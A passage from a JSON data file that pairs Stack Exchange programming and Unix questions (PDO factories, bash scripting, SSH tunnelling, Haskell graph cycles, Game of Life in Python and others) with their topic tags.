    "source": "PDO anonymous function inside a Factory <eos> In this question here on S.O, the accepted answer suggests to use both anonymous function and factory pattern for dealing with PDO connection. I believe the anonymous function is used in case a connection to a different database needs to be established, a different function will be defined for that. In that case, will it be alright to move the anonymous function to the factory class itself? With this approach  just passing the PDO parameters to the constructor will achieve the same as the original answer.Something like:class StructureFactory{    protected $provider = null;    protected $connection = null;    public function __construct( $PDO_Params )    {        $this->provider = function() {            $instance = new PDO($PDO_Params[dsn], $PDO_Params[username], $PDO_Params[password]);            $instance->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);            $instance->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);            return $instance;        };    }    public function create( $name)    {        if ( $this->connection === null )        {            $this->connection = call_user_func( $this->provider );        }        return new $name( $this->connection );    }}",
    "target": "php;object oriented;pdo;factory method"
  },
  {
    "id": "_cs.77062",
    "source": "Understanding Incentive Compatibility of pooled Bitcoin Mining paper <eos> I'm trying to understand the paper Incentive Compatibility ofBitcoin Mining Pool Reward Functions (Schrijvers, Bonneau, Doneh and Roughgarden, in Financial Cryptography and DataSecurity FC 2016 Workshops, BITCOIN, 2016; PDF).In page 3 Section 2.1, they say pool operator does not know actual $\\alpha_i$ mining power of player $i$. To estimate $\\alpha_i$ depends on the reported shares and solutions.A reward function $ R\\colon H \\mapsto [0,1]^n$ is a function from a history transcript to an allocation $ \\{a_i\\}_{i=0} ^ {n} $ with $ \\sum_i a_i =1 $. I don't understand this? What allocation does the authors mean?What I somewhat understand from next para is $ H(k) = b = (y_1(k), \\cdots, y_i(k) ) $ where $y_i(k)$ is no of shares reported by player $i$ in round $k$.This I am basing on $H$ contains for each miner $i$ the total no of shares $b_i$ reported in that round. History transcript is given by a vector $b \\in N^n $.Also what do they mean when they say  We use vector notation for $b$, so $b_1 + b_2 $ means component wise addition of these, and  $\\|b\\|_1 = \\sum_{i=1}^n b_i $ is the sum of components of $b$Could someone explain with examples or in a more concrete way ?Also any suggestions for understanding this paper would be much appreciated. Thanks.",
    "target": "algorithms;cryptography;game theory;one way functions"
  },
  {
    "id": "_unix.147203",
    "source": "Ping multiple hosts and execute command <eos> I'm very new in bash scripting and unix so I will need some help on this.I have 7-10 hosts which I want to ping from one of the servers via cronjobs. What I want is when host is up to execute command on it. When is down do nothing. I don't want logs or any messages.So far I have this and unfortunately don't have ability to try it right now. If you can just check it and point me.#!/bin/bashservers=( 1.1.1.1 2.2.2.2 3.3.3.3 4.4.4.4 5.5.5.5 6.6.6.6 7.7.7.7 )for i in ${servers[@]}do  ping -c 1 $i > /dev/null  doneping -c 1 $i > /dev/nullif [ $? -ne 0 ]; then    if [ $STATUS >= 2 ]; then        echo     fielse    while [ $STATUS <= 1 ];    do        # command should be here where is status 1 ( i.e. Alive )       /usr/bin/snmptrap -v 2c -c public ...    donefiI'm not sure if this is right or no. I've used this from one tutorial and there is some things that I'm not sure what they exactly do.Am I on right way here or I'm totaly wrong?",
    "target": "shell;ping;hosts"
  },
  {
    "id": "_unix.301962",
    "source": "What is BTN_TRIGGER_HAPPY? <eos> I'm writing kinda virtual keyboard using uinput and during looking into what all should I put intoioctl(fd, UI_SET_KEYBIT, ???);I found input-event-codes.h. Some constants there are pretty self-explanatory (KEY_1, KEY_D, ...), but some are a bit more cryptic.Is there anywhere documentation where those keycodes are listed and explained? I tried google, but BTN_TRIGGER_HAPPY didn't lead me to anywhere useful :/ What is this keycode useful for?PS: If there is complete list somewhere, that would be nice, there is a few more quite interesting (KEY_HIRAGANA? KEY_102ND? ...).",
    "target": "input;header file"
  },
  {
    "id": "_codereview.158574",
    "source": "Convert an image into characters and colors for the windows console <eos> I've written a function to convert an image into characters and colors for the windows console. At the moment the calculation takes about 13 seconds with a 700x700 pixel image but that time is undesirable especially when I plan on making the function more complex in order to account for character shapes.What are some methods to speed up heavy calculations and loops like below in C++? I've been recommended multiple threads, SIMD, and inline assembly but how would I go about improving a function like below with those methods?This is the current code I'm using.unsigned char characterValues[256] = { 0 };// This operation can be done ahead of time when the program is started up{    ResourceInputStream in = ResourceInputStream();    // This image is the font for the console. The background color is black while the foreground color is white    in.open(BMP_FONT, 2); // 2 is for RT_BITMAP, BMP_FONT is a resource    if (in.isOpen()) {        auto bmp = readBitmap(&in, true);        in.close();        for (int x = 0; x < bmp->size.x; x++) {            for (int y = 0; y < bmp->size.y; y++) {                int charIndex = (x / 8) + (y / 12) * 16;                if (bmp->pixels[x][y].r == 255)                    characterValues[charIndex]++;            }        }    }}// This operation is for asciifying the image{    FileInputStream in = FileInputStream();    in.open(R(image-path.bmp));    if (in.isOpen()) {        auto bmp = readBitmap(&in, false);        in.close();        // The size of the image in characters        Point2I imageSize = (Point2I)GMath::ceil((Point2F)bmp->size / Point2F(8.0f, 12.0f));        int totalImageSize = imageSize.x * imageSize.y;        auto palette = /* get palette of 16 colors here */        // Iterate through each (character area)        for (int imgx = 0; imgx < imageSize.x; imgx++) {            for (int imgy = 0; imgy < imageSize.y; imgy++) {                // Read image color value                int r = 0, g = 0, b = 0;                int totalRead = 0;                // Read each pixel inside the bounds of a single character                // 8x12 is the size of a character                for (int px = 0; px < 8; px++) {                    for (int py = 0; py < 12; py++) {                        Point2I p = Point2I(imgx * 8 + px, imgy * 12 + py);                        if (p < bmp->size) {                            r += bmp->pixels[p.x][p.y].r;                            g += bmp->pixels[p.x][p.y].g;                            b += bmp->pixels[p.x][p.y].b;                            totalRead++;                        }                    }                }                Color imageValue = Color(r / totalRead, g / totalRead, b / totalRead);                // A combo of a character and foreground/background color                Pixel closestPixel = Pixel();                float closestScore = std::numeric_limits<float>().max();                for (int col = 1; col < 255; col++) {                    unsigned char f = getFColor(col);                    unsigned char b = getBColor(col);                    for (int ch = 1; ch < 255; ch++) {                        // Calculate values                        Color value = Color(                            (palette[f].r * characterValues[ch] + palette[b].r * (TOTAL_CHARACTER_VALUE - characterValues[ch])) / TOTAL_CHARACTER_VALUE,                            (palette[f].g * characterValues[ch] + palette[b].g * (TOTAL_CHARACTER_VALUE - characterValues[ch])) / TOTAL_CHARACTER_VALUE,                            (palette[f].b * characterValues[ch] + palette[b].b * (TOTAL_CHARACTER_VALUE - characterValues[ch])) / TOTAL_CHARACTER_VALUE                        );                        Color fvalue = Color(                            (palette[f].r * characterValues[ch]) / TOTAL_CHARACTER_VALUE,                            (palette[f].g * characterValues[ch]) / TOTAL_CHARACTER_VALUE,                            (palette[f].b * characterValues[ch]) / TOTAL_CHARACTER_VALUE                        );                        Color bvalue = Color(                            (palette[b].r * (TOTAL_CHARACTER_VALUE - characterValues[ch])) / TOTAL_CHARACTER_VALUE,                            (palette[b].g * (TOTAL_CHARACTER_VALUE - characterValues[ch])) / TOTAL_CHARACTER_VALUE,                            (palette[b].b * (TOTAL_CHARACTER_VALUE - characterValues[ch])) / TOTAL_CHARACTER_VALUE                        );                        // Add up score here                        float score =                            (float)((int)value.r - (int)imageValue.r) * (float)((int)value.r - (int)imageValue.r) +                            (float)((int)value.g - (int)imageValue.g) * (float)((int)value.g - (int)imageValue.g) +                            (float)((int)value.b - (int)imageValue.b) * (float)((int)value.b - (int)imageValue.b) +                            (float)((int)fvalue.r - (int)imageValue.r) * (float)((int)fvalue.r - (int)imageValue.r) +                            (float)((int)fvalue.g - (int)imageValue.g) * (float)((int)fvalue.g - (int)imageValue.g) +                            (float)((int)fvalue.b - (int)imageValue.b) * (float)((int)fvalue.b - (int)imageValue.b) +                            (float)((int)bvalue.r - (int)imageValue.r) * (float)((int)bvalue.r - (int)imageValue.r) +                            (float)((int)bvalue.g - (int)imageValue.g) * (float)((int)bvalue.g - (int)imageValue.g) +                            (float)((int)bvalue.b - (int)imageValue.b) * (float)((int)bvalue.b - (int)imageValue.b);                        // More                        if (score < closestScore) {                            closestPixel = Pixel((unsigned char)ch, (unsigned char)col);                            closestScore = score;                        }                    }                }                // Set the character/color combo here            }        }    }}As a bonus, this is the result of my calculation. There's definitely room for improvement with the scoring but at least you can see the shape and colors.",
    "target": "c++;time limit exceeded;image;console;windows"
  },
  {
    "id": "_unix.192884",
    "source": "Why doesn't yum-builddep install all dependencies? <eos> What worked for other packages, doesn't work for kernel. Why?First, sync:[git@dioptase SRPMS]$ ssh root@localhost yum-builddep /home/git/rpmbuild/SRPMS/kernel-2.6.32-431.el6.src.rpmGetting requirements for kernel-2.6.32-431.el6.src --> Already installed : module-init-tools-3.9-21.el6_4.x86_64 --> Already installed : patch-2.6-6.el6.x86_64 --> Already installed : bash-4.1.2-15.el6_4.x86_64 --> Already installed : coreutils-8.4-31.el6.x86_64 --> Already installed : 2:tar-1.23-11.el6.x86_64 --> Already installed : bzip2-1.0.5-7.el6_0.x86_64 --> Already installed : 1:findutils-4.4.2-6.el6.x86_64 --> Already installed : gzip-1.3.12-19.el6_4.x86_64 --> Already installed : m4-1.4.13-5.el6.x86_64 --> Already installed : 4:perl-5.10.1-136.el6.x86_64 --> Already installed : 1:make-3.81-20.el6.x86_64 --> Already installed : diffutils-2.8.1-28.el6.x86_64 --> Already installed : gawk-3.1.7-10.el6.x86_64 --> Already installed : gcc-4.4.7-4.el6.x86_64 --> Already installed : binutils-2.20.51.0.2-5.36.el6.x86_64 --> Already installed : redhat-rpm-config-9.0.3-42.el6.noarch --> Already installed : net-tools-1.60-110.el6_2.x86_64 --> Already installed : patchutils-0.3.1-3.1.el6.x86_64 --> Already installed : rpm-build-4.8.0-37.el6.x86_64 --> Already installed : xmlto-0.0.23-3.el6.x86_64 --> Already installed : asciidoc-8.4.5-4.1.el6.noarch --> Already installed : gnupg2-2.0.14-6.el6_4.x86_64 --> Already installed : python-2.6.6-51.el6.x86_64 --> Already installed : hmaccalc-0.9.12-1.el6.x86_64No uninstalled build requiresThen build:[git@dioptase SRPMS]$ rpmbuild --rebuild kernel-2.6.32-431.el6.src.rpmInstalling kernel-2.6.32-431.el6.src.rpmwarning: user mockbuild does not exist - using rootwarning: group mockbuild does not exist - using rooterror: Failed build dependencies:        elfutils-libelf-devel is needed by kernel-2.6.32-431.el6.x86_64        elfutils-devel is needed by kernel-2.6.32-431.el6.x86_64        binutils-devel is needed by kernel-2.6.32-431.el6.x86_64        newt-devel is needed by kernel-2.6.32-431.el6.x86_64        python-devel is needed by kernel-2.6.32-431.el6.x86_64        audit-libs-devel is needed by kernel-2.6.32-431.el6.x86_64",
    "target": "rhel;yum;rpm"
  },
  {
    "id": "_softwareengineering.171024",
    "source": "Never do in code what you can get the SQL server to do well for you - Is this a recipe for a bad design? <eos> It's an idea I've heard repeated in a handful of places. Some more or less acknowledging that once trying to solve a problem purely in SQL exceeds a certain level of complexity you should indeed be handling it in code.The logic behind the idea is that for the large majority of cases, the database engine will do a better job at finding the most efficient way of completing your task than you could in code. Especially when it comes to things like making the results conditional on operations performed on the data. Arguably with modern engines effectively JIT'ing + caching the compiled version of your query it'd make sense on the surface.The question is whether or not leveraging your database engine in this way is inherently bad design practice (and why). The lines become blurred further when all the logic exists inside the database and you're just hitting it via an ORM.",
    "target": "design patterns;sql"
  },
  {
    "id": "_unix.349074",
    "source": "Running R project script with arguments within AWK in a Bash Script (Ubuntu Linux) <eos> I have this code where the cmd usually works if I sprintf something to it, but when I try to run my Rscript, it does not work. Any hints?I get the error:awk: cmd. line:9:         cmd = Rscript ./date-script-r.r $1 3 2 1;awk: cmd. line:9:                       ^ syntax errorawk: cmd. line:9:         cmd = Rscript ./date-script-r.r $1 3 2 1;awk: cmd. line:9:                         ^ unterminated regexpCode:awk=/usr/bin/awkawkcommand='#d is the delimiterBEGIN { OFS = FS = d }$1 {    #Expected args for the Rscript: (1, 2, 3, 4) = (dateString, yearPosition, monthPosition, dayPosition)    cmd = Rscript ./date-script-r.r $1 3 2 1;    cmd | getline $1;    print;    close(cmd);}awk -v d=, $awkcommand output-data/$filename > output-data/tmp.csvExample of R-script output:Rscript date-script-r.r 17-12-12 1 2 312-12-2017",
    "target": "bash;awk;r"
  },
  {
    "id": "_codereview.11181",
    "source": "Counting the number of bits of a positive integer <eos> How can I improve this code for counting the number of bits of a positive integer n in Python?def bitcount(n):    a = 1    while 1<<a <= n:        a <<= 1    s = 0    while a>1:        a >>= 1        if n >= 1<<a:            n >>= a            s += a    if n>0:        s += 1    return s",
    "target": "python;algorithm;bitwise"
  },
  {
    "id": "_softwareengineering.356153",
    "source": "C# EntityFramework 6 DbContext and data service with dependency injection <eos> I am refactoring an application that collects and displays measurement data that is stored in a database. Currently I have an interface calleIMeasurementsDataService and an implementation MeasurementsDataServicepublic interface IMeasurementsDataService{  IEnumerable<MeasurementResult> GetResults(DateTime rangeStart, DateTime rangeEnd);  void AddResult(MeasurementResult result);  void ModifyResult(MeasurementResult result);  void DeleteMeasurement(MeasurementResult result);}Since the service is not used continiously, each method creates a DbContext instance and disposes it when finshed. For example the add method looks like this: public void AddResult(MeasurementResult newResult){  using (var context = new MeasurementsDbContext())  {    ...    context.SaveChanges();  }}I am injecting a singleton instance of MeasurementsDataService to some ViewModels and create Mocks of IMeasurementsDataService for unit tests.But now I want to add a new method to IMeasurementsDataService and want to also add unit tests. Until now I have used a local SQL server database that I always clear and prefill with some data before each unit test and then use the real MeasurementsDbContextto perform the test operations. But this approach is very time consuming and I would prefer to also mock the DbContext and provide some data directly from code. But when I change the code and inject the DbContext to the MeasurementsDataService, the DbContext lives through the whole livetime of the application what I consider as bad practise. Creating a new instance of IMeasurementsDataService every time I need it also seems not a solution because than I loose the ability to unit test the ViewModels properly. I am thinking of providing some kind of MeasurementDataServiceFactory to the ViewModels, that creates instances of the data service when requested and can be mocked to provide some different data service for testing. The the data service can have a DbContext per instance.Do you think this is a good solution or does anyone has a better and easier to handle solution to inject data services to view models and contexts to data services without having a DbContext living for the whole application runtime?",
    "target": "c#;unit testing;dependency injection;class design;entity framework"
  },
  {
    "id": "_webapps.88129",
    "source": "Hide player controls while fullscreen in YouTube <eos> Is it possible to prevent YouTube's (HTML5) fullscreen player controls from showing whenever it first goes into fullscreen mode?Like, don't show this automatically (at all):I want it to still show if I move the mouse, as it does now.I couldn't find anything in about:config on Firefox about this, only settings to disable the fullscreen button and the 'this page is now in fullscreen' warning.",
    "target": "youtube"
  },
  {
    "id": "_unix.2645",
    "source": "Difference between references of Linux utilities, commands and programs <eos> I read uses of the word utilities for commands/programs such as 'ls', 'chmod', 'mv', etc.Is commands is Linux referring to the same things as top, ps, etc., or are those something different? What about programs? Are those the ones that don't come with the standard distribution which need to be installed like irssi, emacs, kismet, etc.?",
    "target": "command line;utilities;terminology"
  },
  {
    "id": "_unix.88281",
    "source": "Method to check connectivity to other server <eos> I want to check connectivity between 2 servers (i.e. if ssh will succeed).The main idea is to check the shortest way between server-a and server-b using a list of middle servers (for example if I'm on dev server and I want to connect to prod server - usually a direct ssh will fail).Because this can take a while, I prefer not to use SSH - rather I prefer to check first if I can connect and if so then try to connect through SSH.Some possible routes to get the idea:server-a -> server-bserver-a -> middle-server-1 -> server-bserver-a -> middle-server-6 -> server-bserver-a -> middle-server-3 -> middle-server-2 -> server-bHope you understand what I'm looking for?",
    "target": "linux;networking;ssh"
  },
  {
    "id": "_unix.382143",
    "source": "Is /etc/init.d hard-linked on CentOS? <eos> I understand why hard links on directories are dangerous (loops, problems for rmdir because of the parent-directory-link) and have read the other questions on that topic. And so I assumed that hard links on directories apart from . and .. are not used. And yet I see the following on CentOS 5 & 6:# ls -id /etc/init.d/459259 /etc/init.d/# ls -id /etc/rc.d/init.d/459259 /etc/rc.d/init.d/# ls -id /etc/init.d/../458798 /etc/init.d/../# ls -id /etc/rc.d/458798 /etc/rc.d/# ls -id /etc/425985 /etc/In other words 2 different paths to directories pointing to the same inode and the parent of /etc/init.d/ pointing to /etc/rc.d/ instead of /etc/. Is this really a case of hard-linked directories? If not, what is it? If yes, why does Red Hat do that?Edit: I'm sorry for asking a stupid question, I should have been able to see that it's a symlink. Not enough coffee today, it seems.",
    "target": "centos;hard link;sysvinit"
  },
  {
    "id": "_unix.14524",
    "source": "How do I hide packages from appearing in apt system? <eos> The list of uninstalled packages appearing in my aptitude is massive, but is full of packages that I'm very sure I will never ever install. E.g. my laptop is using intel graphics, so it doesn't make sense to install xserver-xorg-video-nouveau. Therefore I want to hide it forever. This is important while listing using !~i!~v, as it shows all packages available for installation (I still need to know the filter for packages with dependencies marked UNAVAILABLE), so if I can hide them, it's easier to find packages that I haven't tried out.How do I make it so, if possible, for the whole apt database to ignore the uninteresting packages?",
    "target": "apt;aptitude"
  },
  {
    "id": "_unix.84592",
    "source": "SSH reverse tunnel works except when I use a VirtualBox instance at one end. Why does VB break SSH? <eos> VirtualBox seems to break my SSH ProxyCommand... here are the details:I want to open an SSH connection from my laptop to desktop over an SSH (reverse) tunnel. I want to do that in one step using ProxyCommand (and netcat). It works when run from the installed OS on my laptop. It fails when run from a VirtualBox guest on my laptop.My normal setup is that Kubuntu 12.04 is running in VirtualBox on the desktop and Kubuntu 12.04 is installed directly on my laptop. This works fine.However, if I try to do the exact same thing with a Kubuntu 12.04 VirtualBox instance on my laptop, it fails as I will detail below.Here's what my SSH tunnel looks like:laptop--->nat--->middleman<--nat<--desktopThe desktop & laptop run Kubuntu 12.04 regardless of whether I'm using VirtualBox; and the middleman is Ubuntu 8.04. I'll describe my SSH tunnel in more detail. Regarding this leg:middleman<--nat<--desktop...here is how it is established:autossh -M 5234 -N -f -R 1234:localhost:22 user@middleman.comThat part is automatic and trouble-free.From the laptop:laptop--->nat--->middlemanI can connect to middleman and then from the middleman to the desktop in two steps under all conditions:me@laptop:~$ ssh -i ~/.ssh/id_rsa admin@middleman      admin@middleman:~$ ssh -i ~/.ssh/id_rsa localhost -p 1234To do this in one step I use netcat (nc) on middleman and I edit my SSH config file on laptop to use ProxyCommand and nc:me@laptop:~/.ssh$ nano configThe contents are:Host family_desktops  ProxyCommand ssh middleman_fqdn nc localhost %p  User admin  PasswordAuthentication no  IdentityFile ~/.ssh/my_id_rsaWhere middleman_fqdn is like middleman.comThen I just connect to desktop in one step:me@laptop:~$ ssh family_desktops -p 1234Here's the problem. This works when run directly from my laptop (where Kubuntu 12.04 is installed). But when I run it from VirtualBox instance of Kubuntu 12.04 (guest) on my laptop, it does not work. SSH asks for the password for middleman. There is no password set up, so I cannot connect. The strange thing is that running the two separate commands allows me to connect to my desktop and it doesn't ask for a password. The ssh -vvv option shows no errors and nothing helpful.I have been troubleshooting all day and I cannot find any difference in settings between the VirtualBox instance and the host OS on my laptop. I use the exact same id_rsa keys (public & private), the same user, and auth.log on the middleman server indicates it sees the same IP address in both cases. So why would running VirtualBox on my laptop make this SSH tunnel stop working (at least working in one step)?",
    "target": "ssh;virtualbox;proxy;ssh tunneling"
  },
  {
    "id": "_codereview.90954",
    "source": "Detecting cycles in a directed graph without using mutable sets of nodes <eos> I recently came across the classic algorithm for detecting cycles in a directed graph using recursive DFS. This implementation makes use of a stack to track nodes currently being visited and an extra set of nodes which have already been explored. The second set is not strictly required, but it is an optimization to prevent iterating over path suffixes that have previously been determined not to be part of a cycle.I had no trouble implementing this in Python by simply creating a (mutable) set object and sharing it between all branches of the recursion.My attempt to reimplement this algorithm in Haskell turned out to be much worse (and still isn't as efficient as the original).I would like some pointers about how to restructure this so that it isn't a mess of recursive folds, but without giving up the set of visited, nodes, which lets me avoid taking branches that have already been explored.import Data.Maybeimport qualified Data.IntMap.Strict as Mimport qualified Data.Char as Cimport Debug.Traceedges :: Stringedges =  a b\\n\\  \\a c\\n\\  \\b c\\n\\  \\b d\\n\\  \\c d\\n\\  \\c e\\n\\  \\e f\\n\\  \\e g\\n\\  \\f g\\n\\  \\g ctype Node = IntparseGraph :: String -> M.IntMap [Node]parseGraph = foldr go M.empty . lines  where go line m = let [key, rule] = map ruleToKey (words line)                    in M.insertWith inserter key [rule] m        inserter [rule] olds = rule:oldsruleToKey :: String -> NoderuleToKey rule = C.ord (head rule) - 97keyToRule :: Node -> StringkeyToRule key = return $ C.chr (key + 97)hasCycle :: M.IntMap [Node] -> Maybe [Node]hasCycle m = reverse <$> ret  where dummyM = M.insert phantom (reverse $ M.keys m) m        phantom = -1        (_, _, ret) = hasCycleHelper dummyM phantom ([], [], Nothing)hasCycleHelper :: M.IntMap [Node] -> Node -> ([Node], [Node], Maybe [Node]) -> ([Node], [Node], Maybe [Node])hasCycleHelper rules rule (visited', visiting', cyc) =  trace rendered $    case () of      _ | isJust cyc || rule `elem` visited' -> (visited', visiting', cyc)        | rule `elem` visiting' -> ([], [], Just (takeWhile (/= rule) visiting' ++ [rule]))        | otherwise ->  returned  where    children = M.findWithDefault [] rule rules    (visited, _, ret) = foldr (hasCycleHelper rules) acc children    returned = (rule:visited, visiting', ret)    acc = (visited', rule:visiting', Nothing)    rendered =    Current ' ++ keyToRule rule ++ ',                ++ Visiting ' ++ map (head . keyToRule) visiting' ++ ',                ++ Visited ' ++ map (head . keyToRule) visited' ++ ',                ++ Found  ++ show (map (head . keyToRule) <$> cyc)main :: IO ()main = do  let rules = parseGraph edges      cyc = map keyToRule <$> hasCycle rules  print cycWith output:Current '`', Visiting '', Visited '', Found NothingCurrent 'a', Visiting '`', Visited '', Found NothingCurrent 'c', Visiting 'a`', Visited '', Found NothingCurrent 'e', Visiting 'ca`', Visited '', Found NothingCurrent 'g', Visiting 'eca`', Visited '', Found NothingCurrent 'c', Visiting 'geca`', Visited '', Found NothingCurrent 'f', Visiting 'eca`', Visited 'g', Found Just gecCurrent 'd', Visiting 'ca`', Visited 'eg', Found Just gecCurrent 'b', Visiting 'a`', Visited 'ceg', Found Just gecCurrent 'b', Visiting '`', Visited 'aceg', Found Just gecCurrent 'c', Visiting '`', Visited 'aceg', Found Just gecCurrent 'e', Visiting '`', Visited 'aceg', Found Just gecCurrent 'f', Visiting '`', Visited 'aceg', Found Just gecCurrent 'g', Visiting '`', Visited 'aceg', Found Just gecJust [c,e,g]Because I'm using foldr, it can't abort the search after discovering a cycle. It has to iterate over all the nodes in the graph at the top level, carrying along the result. I think that's pretty miserable, but I thought I'd ask about it before rewriting everything.",
    "target": "haskell;functional programming;graph;depth first search;memoization"
  },
  {
    "id": "_unix.272800",
    "source": "Find and replace in Linux <eos> I want to replace 0/1 with hetero but whenever I am trying to use the known commands it is showing syntax error because the / is aleady part of the command .. Can anyone suggest a command to solve this issue??",
    "target": "find;command;replace"
  },
  {
    "id": "_codereview.111449",
    "source": "Game of Life rules in 14 lines of Python <eos> I've attempted a functional solution to Conway's Game of Life in Python.The example code allows you to see the next generation of the universe by calling the step() function, passing the current generation of the universe. The universe is represented as a set of live cells. Live cells are represented as a tuple of x, y coordinates.All suggestions for improvement are welcome. I'd especially like feedback on the following:Approach - is it functional? If not, why not?Test cases - are there any test case I've missed that highlight a bug? Can it be done with less test cases while maintaining the same code coverage?Python idioms and conventionsMaking use of built-in functions and datatypesimport unittestdef get_neighbours(x, y):    '''    Returns the set of the given cell's (x,y) 8 eight neighbours.     :param x: x coordinate of cell    :param y: y coordinate of cell    '''    return {(x + dx, y + dy) for dx, dy in [(-1, -1), (-1, 0), (-1, 1), (0, -1), (0, 1), (1, -1), (1, 0), (1, 1)]}def is_survivor(universe, x, y):    '''    Returns True if given cell will survive to the next generation, False otherwise.    :param universe: set of live cells in the universe. A live cell is the tuple (x,y)    :param x: x coordinate of cell    :param y: y coordinate of cell    '''    num_live_neighbours = len(get_neighbours(x, y) & universe)    return num_live_neighbours == 2 or num_live_neighbours == 3def is_born(universe, x, y):    '''    Returns True if given cell will be born in the next generation, False otherwise.     :param universe: set of live cells in the universe. A live cell is the tuple (x,y)    :param x: x coordinate of cell    :param y: y coordinate of cell    '''    return len(get_neighbours(x, y) & universe) == 3def step(universe):    '''    Returns the new universe after a single step in the game of life.    :param universe: set of live cells in the universe. A live cell is the tuple (x,y)    '''    survivors = { (x, y) for x, y in universe if is_survivor(universe, x, y) }    list_of_neighbour_sets = [get_neighbours(x, y) for x, y in universe]    flattened_neighbour_set = {item for subset in list_of_neighbour_sets for item in subset}    dead_neighbours = flattened_neighbour_set - universe    births = { (x, y) for x, y in dead_neighbours if is_born(universe, x, y) }    return survivors | birthsclass Test(unittest.TestCase):    def test_get_neigbours(self):        self.assertEqual({(-1, -1), (0, -1), (1, -1), (-1, 0), (1, 0), (-1, 1), (0, 1), (1, 1)}, get_neighbours(0, 0))        self.assertEqual({(4, 5), (4, 6), (4, 7), (5, 5), (5, 7), (6, 5), (6, 6), (6, 7)}, get_neighbours(5, 6))    def test_is_survivour_should_return_true_if_cell_has_2_live_neighbours(self):        self.assertTrue(is_survivor({(0, 0), (1, 0), (2, 0)}, 1, 0))    def test_is_survivour_should_return_true_if_cell_has_3_live_neighbours(self):        self.assertTrue(is_survivor({(0, 0), (1, 0), (0, 1), (1, 1)}, 0, 0))        self.assertTrue(is_survivor({(0, 0), (1, 0), (0, 1), (1, 1)}, 1, 0))        self.assertTrue(is_survivor({(0, 0), (1, 0), (0, 1), (1, 1)}, 0, 1))        self.assertTrue(is_survivor({(0, 0), (1, 0), (0, 1), (1, 1)}, 1, 1))    def test_is_survivour_should_return_false_if_cell_is_underpopulated(self):        self.assertFalse(is_survivor({(0, 0)}, 0, 0))    def test_is_survivour_should_return_false_if_cell_is_overpopulated(self):        self.assertFalse(is_survivor({(-1, -1), (0, -1), (1, -1), (-1, 0), (1, 0), (-1, 1), (0, 1), (1, 1)}, 0, 0))    def test_is_born_should_return_false_if_dead_cell_doesnt_have_exactly_3_live_neighbours(self):        self.assertFalse(is_born({(0, 0)}, 0, 0))    def test_is_born_should_return_true_if_dead_cell_has_exactly_3_live_neighbours(self):        self.assertTrue(is_born({(0, 0), (1, 0), (0, 1)}, 1, 1))    def test_L_becomes_block_after_step(self):        self.assertEqual({(0, 0), (1, 0), (0, 1), (1, 1)}, step({(0, 0), (0, 1), (1, 1)}))if __name__ == __main__:    unittest.main()",
    "target": "python;python 3.x;functional programming;game of life"
  },
  {
    "id": "_softwareengineering.103375",
    "source": "How should I document a Python script? <eos> I have a couple of Python modules that are meant to be run as scripts. How should I write the docstrings at the module and function level to make it clear how to run and use the module?",
    "target": "python;documentation"
  },
  {
    "id": "_webmaster.2938",
    "source": "When should i consider having text as an image in my website heading <eos> i see many sites that have their heading as an image.  what is the benefit of this? when is a best practice to use text as images as opposed to just having text in my html.  is this just for supporting non standard fonts?",
    "target": "website design;images"
  },
  {
    "id": "_webapps.62940",
    "source": "Is there a way to hide the collapse/expand button in draw.io? <eos> I'd like to align the titles in my swimlanes to the left side, but the collapse/expand buttons are hiding the words. Is there a way I can make that kind of button invisible?I've looked through the code that's editable and haven't found it there either. When I use element inspector it shows the collapse/expand button as being separate from the container it's attached to.",
    "target": "draw.io"
  },
  {
    "id": "_datascience.22118",
    "source": "Why do we need for Shortcut Connections to build Residual Networks? <eos> Why do we need for Shortcut Connections to build Residual Networks, and how it help to train neural networks for classification and detection?",
    "target": "machine learning;neural network;deep learning;computer vision;caffe"
  },
  {
    "id": "_unix.332347",
    "source": "map the results from find <eos> I have these results from find:$ find subprojects -mindepth 1 -maxdepth 1subprojects/install-globally-firstsubprojects/installation-test-project-custom-configsubprojects/install-via-githubsubprojects/init-from-nothingsubprojects/node-path-testsubprojects/install-globally-with-nvmsubprojects/installation-test-projectsubprojects/parallel-installs-of-sumanI want to map these results to:subprojects/install-globally-first/test.shsubprojects/installation-test-project-custom-config/test.shsubprojects/install-via-github/test.shsubprojects/init-from-nothing/test.shsubprojects/node-path-test/test.shsubprojects/install-globally-with-nvm/test.shsubprojects/installation-test-project/test.shsubprojects/parallel-installs-of-suman/test.sh(All I am doing in this case is appending /test.sh to the results...I am sure a good solution is something like:$ find subprojects -mindepth 1 -maxdepth 1 | something (?)but I don't know what it would be! Pretty newby here. Probably more than one way to do it, looking for simplest most robust solution I guess.Note that since the test.sh files already exist in these paths, I could just to do this:find subprojects -mindepth 2 -maxdepth 2 -name test.shBut I guess I am looking for away to do that, assuming these test.sh files don't exist yet on the filesystem.",
    "target": "find;pipe;xargs"
  },
  {
    "id": "_cstheory.31652",
    "source": "Inverting Matrix in Prony's Algorithm <eos> I'm reading Ankur Moitra's excellent lectures notes at http://people.csail.mit.edu/moitra/docs/bookex.pdf .In Chapter4, the notes claim that a certain circulant matrix of fourier coefficients is invertible [left as exercise to reader, and I can't find the footnote]. I can not prove it. I'm also not convinced it's true. The pages are attached. Any pointers as to what I should read up on would be helpful.Thanks!EDIT: Images are high resolution. Click open image in new tab.",
    "target": "linear algebra"
  },
  {
    "id": "_unix.293191",
    "source": "How to pass string with special characters to shell command in a script? <eos> I'm writing a small script that will help me debug some permission problems.  I am passing the parent folder I wish to examine and am able to specify any sub-folders which I want to ignore.I'm having a problem passing the constructed parameter string to find because some parts of it (the are being escaped.  I can't seem to figure out how to provide the wildcard into the command in such a way that find accepts it properly.  With the wildcard in place, that portion of the path string is qualified using single quotes that are escaped using '\\'' and are confusing me (as I can't figure out how to control the transformation) and find (which is essentially ignoring my excludes)I've been reading all about single and double quotes as well as escaping characters, but I haven't found an example similar to mine.#!/bin/bash -f# output permissions and ownership with path relative to specified parent.Usage=$0 <parent path> <excluded child folder> ....if [ $# -lt 1 ]then    (>&2 echo -e $Usage)    exit 1else     parent=$1    shift    if [ $# -gt 0 ]    then        excludes= (        for folder in $@        do            thisLine= ! -path $parent$folder ! -path '$parent$folder/*'    <=== the '*' wildcard is causing the problem I think.            excludes=$excludes$thisLine        done        excludes=$excludes )    fi    (>&2 echo => find $parent $excludes -ls | awk '{print '$3|$5|$6|$11}'')    (>&2 echo )set -vx    find $parent $excludes -ls | awk '{print $3|$5|$6|$11}'fiThe branch of the tree that I'm working with is /home/user/catkin_ws/src/clfsm which has three sub-folders, two of which I wish to exclude; cmake & include.  The output below is in two parts:  Top is the 